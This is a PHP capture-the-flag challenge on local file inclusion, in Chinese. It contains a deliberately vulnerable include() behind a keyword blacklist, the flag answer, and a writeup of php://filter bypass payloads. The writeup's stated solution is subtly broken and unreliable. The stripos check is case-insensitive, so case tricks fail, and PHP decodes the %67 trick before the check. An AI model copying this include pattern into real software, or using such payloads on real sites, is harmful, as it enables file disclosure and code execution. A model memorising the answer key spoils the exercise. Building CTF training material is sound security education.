<?php
/*
 * 题目3: 文件包含与伪协议
 * 考察点: LFI、PHP伪协议、php://filter、data://、日志包含
 * 难度: 中等
 * Flag: flag{php_pr0t0c0l_1s_p0w3rful}
 */

error_reporting(0);
highlight_file(__FILE__);

// flag在flag.php中
$file = isset($_GET['file']) ? $_GET['file'] : 'welcome';

// 过滤危险字符
$blacklist = ['../', '..\\', 'flag', 'php://', 'data://', 'input', 'log'];
$filtered = $file;

foreach ($blacklist as $word) {
    if (stripos($file, $word) !== false) {
        die("Hacker detected! Blocked: " . htmlspecialchars($word));
    }
}

// 强制添加.php后缀
$filepath = $file . '.php';

// 检查文件是否存在
if (file_exists($filepath)) {
    include($filepath);
} else {
    echo "File not found: " . htmlspecialchars($filepath);
}

echo "<br><br>";
echo "Available pages: welcome, about, contact<br>";
echo "Hint: The flag is somewhere you cannot directly access...";
?>
<?php
/*
Writeup:
考察点：
1. 伪协议大小写绕过
2. URL双重编码绕过
3. %00截断（低版本PHP）
4. 利用filter链进行RCE

解题思路：
1. blacklist过滤了php://，但可以用大小写绕过：PHP://
2. 过滤了flag，可以用通配符或编码绕过

Payload方案1 - 大小写绕过读取源码：
?file=PHP://filter/read=convert.base64-encode/resource=fla

方案2 - 双重URL编码（如果服务器有解码）：
%2566lag -> %66lag -> flag

方案3 - PHP Filter链（无需知道文件名，直接RCE）：
使用php://filter/convert.iconv链构造任意字符执行代码

实际解法：
由于过滤不够严格，可以使用：
?file=PHP://filter/convert.base64-encode/resource=fla%67
（%67是g的URL编码，绕过flag关键字检测）

或者利用伪协议大小写：
?file=Php://filter/read=convert.base64-encode/resource=fla%67
*/
?>
